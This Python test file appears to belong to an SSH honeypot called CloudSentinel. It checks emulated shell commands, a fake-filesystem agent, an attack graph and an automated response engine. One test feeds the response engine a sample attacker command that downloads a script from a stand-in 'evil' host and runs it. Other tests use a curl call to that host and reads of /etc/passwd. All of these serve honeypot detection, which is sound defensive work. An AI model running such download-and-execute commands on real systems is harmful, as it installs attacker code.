"""Final coverage batch: forwarder, graph, VFS agent, observability, metrics, SOAR, server."""

from __future__ import annotations

import asyncio
import sys
import time
import types

import pytest

from cloudsentinel import metrics as metrics_module
from cloudsentinel.attack_graph import AttackGraph
from cloudsentinel.config import LLMSettings, RedisSettings, load_settings
from cloudsentinel.pipeline import ClickHouseForwarder, EventEnvelope
from cloudsentinel.sandbox import create_sandbox
from cloudsentinel.server import (
    CloudSentinelSSHServer,
    CloudSentinelSession,
    ConnectionLimiter,
)
from cloudsentinel.soar import SOAREngine
from cloudsentinel.vfs_agent import VFSAgent, VFSContext


class FakeChannel:
    def __init__(self) -> None:
        self.output = b""
        self.exits: list[int] = []

    def write(self, data: str | bytes) -> None:
        if isinstance(data, str):
            data = data.encode()
        self.output += data

    def exit(self, status: int = 0) -> None:
        self.exits.append(status)


def _session():
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.llm.provider = "mock"

    async def emit_event(*_args: object, **_kwargs: object) -> None:
        return None

    fake_server = type(
        "FakeServer",
        (),
        {
            "settings": settings,
            "username": "root",
            "src_ip": "8.8.8.8",
            "started_at": time.time(),
            "anomaly_detector": None,
            "_emit_event": emit_event,
            "_fuzz_detected": False,
            "_tty_logger": type("TTY", (), {"record": lambda self, _data: None})(),
        },
    )()
    return CloudSentinelSession(fake_server)


def test_session_caps_command_line_buffer() -> None:
    session = _session()
    session.data_received("a" * 9000, None)
    assert session.server._fuzz_detected is True
    assert session._line_buffer == b""


@pytest.mark.asyncio
async def test_session_executes_command_chain() -> None:
    session = _session()
    output = await session._execute("id; whoami")
    assert "uid=" in output
    assert "root" in output


@pytest.mark.asyncio
async def test_session_strips_redirect_target() -> None:
    session = _session()
    output = await session._execute("echo hello > /tmp/out")
    assert "hello" in output
    assert ">" not in output


@pytest.mark.asyncio
async def test_session_pipe_filters_output() -> None:
    session = _session()
    output = await session._execute("cat /etc/passwd | grep root")
    assert "root" in output
    output = await session._execute("cat /etc/passwd | grep zzz_not_present")
    assert output == ""
    output = await session._execute("cat /etc/passwd | grep -i ROOT")
    assert "root" in output
    output = await session._execute("echo hello | wc -l")
    assert output.strip() == "1"
    output = await session._execute("cat /etc/passwd | cut -d: -f1 | sort | uniq -c")
    assert "1 root" in output
    output = await session._execute("echo foo | sed 's/foo/bar/'")
    assert output.strip() == "bar"


@pytest.mark.asyncio
async def test_session_pipe_cut_fields() -> None:
    session = _session()
    output = await session._execute("cat /etc/passwd | cut -d: -f1")
    assert "root" in output
    assert ":" not in output


def test_sed_pipe_substitutions() -> None:
    from cloudsentinel.commands.base import Sed

    class Fake:
        def __init__(self, stdin: str) -> None:
            self.stdin = stdin
            self.out: list[str] = []

        def write(self, data: str | bytes) -> None:
            self.out.append(data.decode() if isinstance(data, bytes) else data)

    cases = [
        (["s/foo/bar/"], "foo foo\n", "bar foo\n"),
        (["s/foo/bar/g"], "foo foo\n", "bar bar\n"),
        (["s/foo/bar/i"], "FOO\n", "bar\n"),
        (["s|a|b|"], "a\n", "b\n"),
        (["s/foo/[&]/"], "foo\n", "[foo]\n"),
        (["s/(f)(oo)/\\2\\1/"], "foo\n", "oof\n"),
        (["-e", "s/foo/bar/"], "foo\n", "bar\n"),
        (["-x", "s/foo/bar/"], "foo\n", "bar\n"),
        (["-n", "s/foo/bar/"], "foo\n", ""),
        (["s/[/x/"], "foo\n", ""),
        (["s/foo/\\9/"], "foo\n", ""),
        (["p"], "foo\n", ""),
    ]
    for args, stdin, expected in cases:
        proto = Fake(stdin)
        Sed(proto, *args).start()
        assert "".join(proto.out) == expected

    empty = Fake("")
    Sed(empty, "s/foo/bar/").start()
    assert empty.out == []


def test_sort_pipe_lines() -> None:
    from cloudsentinel.commands.base import Sort

    class Fake:
        def __init__(self, stdin: str) -> None:
            self.stdin = stdin
            self.out: list[str] = []

        def write(self, data: str | bytes) -> None:
            self.out.append(data.decode() if isinstance(data, bytes) else data)

    cases = [
        ([], "b\na\nc\n", "a\nb\nc\n"),
        (["-r"], "b\na\nc\n", "c\nb\na\n"),
        (["-n"], "10\n2\n1\n", "1\n2\n10\n"),
        (["-rn"], "10\n2\n1\n", "10\n2\n1\n"),
        (["-u"], "b\na\nb\n", "a\nb\n"),
        (["-f"], "b\nA\na\n", "A\na\nb\n"),
        (["-n"], "x\n1\n10\n", "x\n1\n10\n"),
        (["-x"], "b\na\n", "a\nb\n"),
        (["--reverse"], "a\nb\n", "b\na\n"),
        (["--numeric-sort"], "10\n2\n", "2\n10\n"),
        (["--unique"], "b\na\nb\n", "a\nb\n"),
        (["--ignore-case"], "b\nA\na\n", "A\na\nb\n"),
        (["-ru"], "b\na\nb\n", "b\na\n"),
        (["-lf"], "B\na\n", "a\nB\n"),
    ]
    for args, stdin, expected in cases:
        proto = Fake(stdin)
        Sort(proto, *args).start()
        assert "".join(proto.out) == expected

    empty = Fake("")
    Sort(empty).start()
    assert empty.out == []


def test_uniq_pipe_groups() -> None:
    from cloudsentinel.commands.base import Uniq

    class Fake:
        def __init__(self, stdin: str) -> None:
            self.stdin = stdin
            self.out: list[str] = []

        def write(self, data: str | bytes) -> None:
            self.out.append(data.decode() if isinstance(data, bytes) else data)

    cases = [
        ([], "a\na\nb\n", "a\nb\n"),
        (["-c"], "a\na\nb\n", "2 a\n1 b\n"),
        (["-d"], "a\na\nb\n", "a\n"),
        (["-u"], "a\na\nb\n", "b\n"),
        (["-cd"], "a\na\nb\n", "2 a\n"),
        (["-cu"], "a\na\nb\n", "1 b\n"),
        (["-du"], "a\na\nb\n", ""),
        (["-x"], "a\na\nb\n", "a\nb\n"),
        (["--count"], "a\na\nb\n", "2 a\n1 b\n"),
        (["--repeated"], "a\na\nb\n", "a\n"),
        (["--unique"], "a\na\nb\n", "b\n"),
    ]
    for args, stdin, expected in cases:
        proto = Fake(stdin)
        Uniq(proto, *args).start()
        assert "".join(proto.out) == expected

    empty = Fake("")
    Uniq(empty, "-c").start()
    assert empty.out == []


def test_wc_pipe_counts() -> None:
    from cloudsentinel.commands.base import Wc

    class Fake:
        def __init__(self, stdin: str) -> None:
            self.stdin = stdin
            self.out: list[str] = []

        def write(self, data: str | bytes) -> None:
            self.out.append(data.decode() if isinstance(data, bytes) else data)

    cases = [
        ([], "one two\nthree\n", "2 3 14\n"),
        (["-l"], "one two\nthree\n", "2\n"),
        (["-w"], "one two\nthree\n", "3\n"),
        (["-c"], "one two\nthree\n", "14\n"),
        (["-l", "-w"], "one two\nthree\n", "2 3\n"),
        (["-lw"], "one two\nthree\n", "2 3\n"),
        (["-lc"], "a\nb\n", "2 4\n"),
        (["--lines"], "one two\nthree\n", "2\n"),
        (["-x"], "one two\nthree\n", "2 3 14\n"),
        (["-l"], "no-newline", "0\n"),
    ]
    for args, stdin, expected in cases:
        proto = Fake(stdin)
        Wc(proto, *args).start()
        assert "".join(proto.out) == expected

    empty = Fake("")
    Wc(empty, "-l").start()
    assert empty.out == []


def test_grep_pipe_flags_and_patterns() -> None:
    from cloudsentinel.commands.base import Grep

    class Fake:
        def __init__(self, stdin: str) -> None:
            self.stdin = stdin
            self.out: list[str] = []

        def write(self, data: str | bytes) -> None:
            self.out.append(data.decode() if isinstance(data, bytes) else data)

    cases = [
        (["-i", "ROOT"], "root:x\nbin:y\n", "root:x\n"),
        (["-v", "root"], "root:x\nbin:y\n", "bin:y\n"),
        (["-c", "root"], "root\nroot\nbin\n", "2\n"),
        (["-iv", "ROOT"], "root\nBIN\n", "BIN\n"),
        (["-F", "a.b"], "a.b\naXb\n", "a.b\n"),
        (["root", "bin"], "root\nbin\nother\n", "root\nbin\n"),
        (["-c", "-v", "root"], "root\nbin\n", "1\n"),
        (["-n", "root"], "root\n", "root\n"),
        (["--color=always", "root"], "root\n", "root\n"),
        (["-E", "ro+t"], "root\n", "root\n"),
        (["--", "-i"], "x-i\n", "x-i\n"),
        (["["], "root\n", ""),
        (["-i"], "root\n", ""),
        (["root"], "", ""),
    ]
    for args, stdin, expected in cases:
        proto = Fake(stdin)
        Grep(proto, *args).start()
        assert "".join(proto.out) == expected


def test_cut_pipe_fields_and_ranges() -> None:
    from cloudsentinel.commands.base import Cut

    class Fake:
        def __init__(self, stdin: str) -> None:
            self.stdin = stdin
            self.out: list[str] = []

        def write(self, data: str | bytes) -> None:
            self.out.append(data.decode() if isinstance(data, bytes) else data)

    cases = [
        (["-d", ":", "-f", "1,3"], "a:b:c\n", "a:c\n"),
        (["-d:", "-f1"], "a:b\n", "a\n"),
        (["-f2-3"], "one\ttwo\tthree\n", "two\tthree\n"),
        (["-f9"], "a:b\n", "\n"),
        (["-f"], "a:b\n", ""),
        (["-f", "x"], "a:b\n", ""),
        (["-f", "x-y"], "a:b\n", ""),
        (["-f", "1,,2"], "a\tb\tc\n", "a\tb\n"),
    ]
    for args, stdin, expected in cases:
        proto = Fake(stdin)
        Cut(proto, *args).start()
        assert "".join(proto.out) == expected

    empty = Fake("")
    Cut(empty, "-f1").start()
    assert empty.out == []


@pytest.mark.asyncio
async def test_session_pipe_awk_fields() -> None:
    session = _session()
    output = await session._execute("cat /etc/passwd | awk -F: '{print $1}'")
    assert "root" in output
    assert ":" not in output


def test_awk_pipe_fields_and_expressions() -> None:
    from cloudsentinel.commands.base import Awk

    class Fake:
        def __init__(self, stdin: str) -> None:
            self.stdin = stdin
            self.out: list[str] = []

        def write(self, data: str | bytes) -> None:
            self.out.append(data.decode() if isinstance(data, bytes) else data)

    cases = [
        (["-F:", "{print $1}"], "root:x:0\nbin:y:1\n", "root\nbin\n"),
        (["-F", ":", "{print $1, $3}"], "root:x:0\n", "root 0\n"),
        (["--field-separator", ":", "{print $2}"], "a:b:c\n", "b\n"),
        (["{print $2}"], "one two three\n", "two\n"),
        (["{print}"], "a b\n", "a b\n"),
        (["{print $NF}"], "a b c\n", "c\n"),
        (["{print $NF}"], "\n", "\n"),
        (["{print NF}"], "a b\n", "2\n"),
        (["{print $9}"], "a b\n", "\n"),
        (["{print \"literal\"}"], "a b\n", "literal\n"),
        (["{print word}"], "a b\n", "word\n"),
        (["{print $1"], "a b\n", ""),
        (["-F"], "a b\n", ""),
    ]
    for args, stdin, expected in cases:
        proto = Fake(stdin)
        Awk(proto, *args).start()
        assert "".join(proto.out) == expected

    empty = Fake("")
    Awk(empty, "{print $1}").start()
    assert empty.out == []


def test_awk_conditions() -> None:
    from cloudsentinel.commands.base import Awk

    class Fake:
        def __init__(self, stdin: str) -> None:
            self.stdin = stdin
            self.out: list[str] = []

        def write(self, data: str | bytes) -> None:
            self.out.append(data.decode() if isinstance(data, bytes) else data)

    cases = [
        (["/root/ {print $1}"], "root:x\nbin:y\n", "root:x\n"),
        (["/[/ {print $1}"], "root\n", ""),
        (["-F:", "$1 == \"root\" {print $3}"], "root:x:0\nbin:y:1\n", "0\n"),
        (["$1 != \"root\" {print $1}"], "root\nbin\n", "bin\n"),
        (["$1 ~ /^r/ {print $1}"], "root\nbin\n", "root\n"),
        (["$1 !~ /^r/ {print $1}"], "root\nbin\n", "bin\n"),
        (["$1 ~ \"root\" {print $1}"], "root\n", ""),
        (["-F:", "$3 >= 1000 {print $1}"], "a:x:1000\nb:y:999\n", "a\n"),
        (["-F:", "$3 < 1000 {print $1}"], "a:x:1000\nb:y:999\n", "b\n"),
        (["-F:", "$3 <= 999 {print $1}"], "a:x:1000\nb:y:999\n", "b\n"),
        (["-F:", "$3 > 999 {print $1}"], "a:x:1000\nb:y:999\n", "a\n"),
        (["-F:", "$NF == \"bash\" {print $1}"], "root:x:0:bash\nbin:y:1:sh\n", "root\n"),
        (["-F:", "$0 ~ /root/ {print $2}"], "root:x\n", "x\n"),
        (["$9 == \"\" {print $1}"], "a b\n", "a\n"),
        (["NF == 3 {print $1}"], "a b c\n", ""),
        (["$1 == root {print}"], "root\n", "root\n"),
        (["$1 > abc {print $1}"], "a\n", ""),
    ]
    for args, stdin, expected in cases:
        proto = Fake(stdin)
        Awk(proto, *args).start()
        assert "".join(proto.out) == expected


@pytest.mark.asyncio
async def test_clickhouse_forwarder_run(tmp_path) -> None:
    class FakeResult:
        def __init__(self, rows: list) -> None:
            self.result_rows = rows

    class FakeClient:
        def __init__(self) -> None:
            self.rows: list = []

        def insert(self, _table: str, data: list, **_kwargs: object) -> None:
            self.rows.extend(data)

    class FakeRedis:
        def __init__(self, forwarder: ClickHouseForwarder) -> None:
            self.forwarder = forwarder
            self.calls = 0

        async def xread(self, *_args: object, **_kwargs: object) -> list:
            self.calls += 1
            if self.calls == 1:
                envelope = EventEnvelope(
                    event_type="cloudsentinel.command.input",
                    session_id="forward-1",
                    src_ip="8.8.8.8",
                    src_port=1,
                    timestamp=time.time(),
                    payload={"eventid": "cloudsentinel.command.input"},
                )
                return [("stream", [("1-0", envelope.to_redis_fields())])]
            self.forwarder._stopped.set()
            return []

    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.clickhouse.enabled = False
    disabled = ClickHouseForwarder(settings.redis, settings.clickhouse)
    await disabled.start()
    await disabled.stop()

    settings.clickhouse.enabled = True
    forwarder = ClickHouseForwarder(settings.redis, settings.clickhouse)
    forwarder._client = FakeClient()
    forwarder._checkpoint_path = tmp_path / "lastid"
    forwarder._redis = FakeRedis(forwarder)  # type: ignore[assignment]
    await forwarder._run()
    assert forwarder._client.rows


def test_attack_graph_branches() -> None:
    graph = AttackGraph(max_nodes=2)
    graph.add_event({"src_ip": "", "session": "x"})
    graph.add_event({"src_ip": "10.0.0.1", "session": "x"})
    graph.add_event(
        {
            "src_ip": "8.8.8.8",
            "session": "s",
            "hassh_md5": "c" * 32,
            "eventid": "cloudsentinel.login.failed",
            "username": "root",
        }
    )
    graph.add_event(
        {
            "src_ip": "8.8.4.4",
            "session": "s2",
            "eventid": "cloudsentinel.command.input",
            "input": "ssh root@10.0.0.9",
            "cloudsentinel_mitre_techniques": ["T1021.004"],
        }
    )
    assert graph.to_cytoscape()["elements"]
    assert graph.get_subgraph("8.8.8.8")["nodes"]


def test_vfs_agent_branches() -> None:
    agent = VFSAgent(LLMSettings(provider="mock"), VFSContext("unit-host", "Ubuntu"))
    try:
        assert agent._is_templated_command("netstat -antp")
        assert agent._is_blocked_command("systemctl status")
        assert agent._is_complex_or_binary("curl http://evil/x")
        assert agent._mock_response("hostname") == "unit-host"
        assert agent._mock_response("pwd") == "/root"
        assert agent._mock_response("id").startswith("uid=0")
        assert agent._mock_response("uname").startswith("Linux")
        assert agent._mock_response("ls")
        assert agent._mock_response("date")
        assert agent._mock_response("uptime")
        assert agent._mock_response("ps")
        assert agent._mock_response("free")
        assert agent._mock_response("df")
        assert agent._mock_response("echo hello").strip() == "hello"
        assert "No such file" in agent._handle_file_read("cat /missing")
        agent._cache["expired"] = (0.0, "old")
        assert agent._get_cache("expired") is None
        for index in range(300):
            agent._set_cache(f"cmd-{index}", "value")
        assert agent._handle_local_state("cd ..") == ""
        assert agent._handle_local_state("export A=1") == ""
    finally:
        asyncio.run(agent.close())


def test_observability_optional_modules(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str] = []

    fake_sentry = types.ModuleType("sentry_sdk")
    fake_sentry.init = lambda **_kwargs: calls.append("sentry")
    monkeypatch.setitem(sys.modules, "sentry_sdk", fake_sentry)
    fake_pyro = types.ModuleType("pyroscope")
    fake_pyro.configure = lambda **_kwargs: calls.append("pyro")
    monkeypatch.setitem(sys.modules, "pyroscope", fake_pyro)
    from cloudsentinel.observability import setup_pyroscope, setup_sentry

    setup_sentry("dsn")
    setup_pyroscope("unit")
    assert "sentry" in calls
    assert "pyro" in calls


def test_metrics_properties() -> None:
    metrics = metrics_module.get_metrics()
    assert metrics.active_sessions >= 0
    assert metrics.mttb_ms >= 0
    assert metrics.total_connections >= 0
    assert metrics.total_auth_failures >= 0
    assert metrics.total_auth_successes >= 0
    assert metrics.total_commands >= 0
    assert metrics.total_blocks >= 0
    assert metrics.total_blocks_iptables >= 0
    assert metrics.pipeline_is_connected in {0, 1}
    assert metrics.pending_events >= 0
    assert metrics.content_type.startswith("text/plain")


@pytest.mark.asyncio
async def test_soar_more_branches() -> None:
    soar = SOAREngine(risk_threshold=70, firewall_enabled=False, firewall_dry_run=True)
    assert soar.is_allowlisted("10.1.1.1") is True
    assert soar.is_allowlisted("8.8.8.8") is False
    low = await soar.process_event(
        "low",
        {
            "eventid": "cloudsentinel.session.connect",
            "session": "low",
            "src_ip": "8.8.8.8",
        },
    )
    assert low["cloudsentinel_soar_action"] in {"none", "detect_only"}
    high = await soar.process_event(
        "high",
        {
            "eventid": "cloudsentinel.command.input",
            "session": "high",
            "src_ip": "8.8.8.8",
            "input": "wget http://evil/bot.sh && chmod 777 bot.sh && bash -c ./bot.sh",
        },
    )
    assert high["cloudsentinel_soar_action"] in {"detect_only", "none"}


@pytest.mark.asyncio
async def test_server_extra_branches() -> None:
    session = _session()
    channel = FakeChannel()
    session.connection_made(channel)
    session.data_received("a" * 70000, None)
    assert session.server._fuzz_detected is True
    session.data_received("\x04", None)
    await session.vfs.close()

    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    server = CloudSentinelSSHServer(
        settings=settings,
        pipeline=types.SimpleNamespace(),
        soar=types.SimpleNamespace(),
        hassh_dna=types.SimpleNamespace(),
        limiter=ConnectionLimiter(max_total=0),
    )
    server._accepted = True
    server._fuzz_detected = True
    assert server.begin_auth("root") is False
    server._fuzz_detected = False
    server.started_at = time.time() - 4000
    assert server.begin_auth("root") is False
